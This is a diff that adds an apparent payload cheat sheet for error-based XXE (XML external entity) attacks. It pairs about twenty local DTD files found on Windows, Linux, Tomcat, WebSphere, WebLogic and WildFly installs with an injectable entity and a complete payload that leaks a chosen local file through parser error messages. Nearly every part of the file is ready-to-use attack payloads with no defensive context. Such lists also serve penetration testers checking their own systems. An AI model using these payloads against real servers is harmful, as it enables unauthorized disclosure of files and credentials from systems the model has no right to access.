@@ -1,0 +1,442 @@
+**DTD File:** `C:\Windows\System32\wbem\xml\cim20.dtd`
+
+**Injectable entity:** `%CIMName`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
+
+    <!ENTITY % CIMName '>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/usr/share/yelp/dtd/docbookx.dtd`
+
+**Injectable entity:** `%ISOamsa`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+
+    <!ENTITY % ISOamsa '
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        '>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+
+
+
+**DTD File:** `/usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd`
+
+**Injectable entity:** `%URI`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd">
+
+    <!ENTITY % URI '(aa) #IMPLIED>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ATTLIST attxx aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+
+**DTD File:** `/usr/local/tomcat/lib/tomcat-coyote.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd`
+
+**Injectable entity:** `%Boolean`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/local/tomcat/lib/tomcat-coyote.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd">
+
+    <!ENTITY % Boolean '(aa) #IMPLIED>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ATTLIST attxx aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd`
+
+**Injectable entity:** `%url.attribute.set`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd">
+
+    <!ENTITY % url.attribute.set '>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd`
+
+**Injectable entity:** `%condition`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd">
+
+    <!ENTITY % condition 'aaa)>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa (bb'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+
+**DTD File:** `/usr/share/xml/fontconfig/fonts.dtd`
+
+**Injectable entity:** `%constant`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
+
+    <!ENTITY % constant 'aaa)>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa (bb'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/usr/share/struts/struts-config_1_1.dtd`
+
+**Injectable entity:** `%AttributeName`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/struts/struts-config_1_1.dtd">
+
+    <!ENTITY % AttributeName '(aa) #IMPLIED>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ATTLIST attxx aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/u01/oracle/wlserver/server/lib/consoleapp/webapp/WEB-INF/struts-config_1_2.dtd`
+
+**Injectable entity:** `%AttributeName`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///u01/oracle/wlserver/server/lib/consoleapp/webapp/WEB-INF/struts-config_1_2.dtd">
+
+    <!ENTITY % AttributeName '(aa) #IMPLIED>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ATTLIST attxx aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+ ---
+
+**DTD File:** `/usr/share/gtksourceview-4/language-specs/language.dtd`
+
+**Injectable entity:** `%itemattrs`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/gtksourceview-4/language-specs/language.dtd">
+
+    <!ENTITY % itemattrs '>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/usr/lib/gap/pkg/GAPDoc-1.6.2/bibxmlext.dtd`
+
+**Injectable entity:** `%n.InProceedings`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/lib/gap/pkg/GAPDoc-1.6.2/bibxmlext.dtd">
+
+    <!ENTITY % n.InProceedings 'aaa)>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa (bb'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/usr/share/boostbook/dtd/boostbook.dtd`
+
+**Injectable entity:** `%boost.common.attrib`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/boostbook/dtd/boostbook.dtd">
+
+    <!ENTITY % boost.common.attrib '>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+
+**DTD File:** `/opt/jboss/wildfly/modules/system/layers/base/org/apache/lucene/main/lucene-queryparser-5.5.5.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd`
+
+**Injectable entity:** `%queries`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///opt/jboss/wildfly/modules/system/layers/base/org/apache/lucene/main/lucene-queryparser-5.5.5.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd">
+
+    <!ENTITY % queries 'aaa)>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa (bb'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/opt/jboss/wildfly/modules/system/layers/base/org/apache/xml-resolver/main/xml-resolver-1.2.jar!/org/apache/xml/resolver/etc/catalog.dtd`
+
+**Injectable entity:** `%publicIdentifier`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///opt/jboss/wildfly/modules/system/layers/base/org/apache/xml-resolver/main/xml-resolver-1.2.jar!/org/apache/xml/resolver/etc/catalog.dtd">
+
+    <!ENTITY % publicIdentifier '(aa) #IMPLIED>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ATTLIST attxx aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/usr/share/nmap/nmap.dtd`
+
+**Injectable entity:** `%attr_numeric`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/nmap/nmap.dtd">
+
+    <!ENTITY % attr_numeric '(aa) #IMPLIED>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ATTLIST attxx aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/usr/share/liteide/liteeditor/kate/language.dtd`
+
+**Injectable entity:** `%commonAttributes`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/liteide/liteeditor/kate/language.dtd">
+
+    <!ENTITY % commonAttributes '>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/usr/share/libgweather/locations.dtd`
+
+**Injectable entity:** `%name`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/libgweather/locations.dtd">
+
+    <!ENTITY % name 'aaa)>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa (bb'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/usr/share/libgda-5.0/dtd/libgda-server-operation.dtd`
+
+**Injectable entity:** `%paramlist-dtd`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/libgda-5.0/dtd/libgda-server-operation.dtd">
+
+    <!ENTITY % paramlist-dtd '
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        '>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/usr/share/libgda-5.0/dtd/libgda-paramlist.dtd`
+
+**Injectable entity:** `%array-dtd`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/libgda-5.0/dtd/libgda-paramlist.dtd">
+
+    <!ENTITY % array-dtd '
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        '>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
